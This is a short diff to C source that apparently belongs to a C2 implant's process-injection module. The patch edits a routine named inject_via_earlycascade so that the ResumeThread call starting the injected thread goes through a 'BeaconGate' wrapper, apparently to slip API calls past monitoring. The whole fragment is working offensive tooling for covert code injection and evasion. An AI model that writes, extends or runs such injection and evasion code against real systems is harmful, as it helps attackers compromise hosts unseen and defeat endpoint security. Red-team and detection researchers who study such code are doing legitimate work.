@@ -21,6 +21,7 @@
  * SharedUserData+0x330 (zero on non-KCFG builds - identity).
  */
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "beacon.h"
 #include "inject.h"
 #include "spawn_trace.h"
@@ -323,7 +324,7 @@ BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPV
 		spawn_log("ec: no primary thread handle - decline", 0x7fffffff);
 		return FALSE;
 	}
-	if (ResumeThread(context->hThread) == (DWORD)-1) {
+	if (gate_ResumeThread(context->hThread) == (DWORD)-1) {
 		spawn_log("ec: ResumeThread failed gle=", (long)GetLastError());
 		return FALSE;
 	}
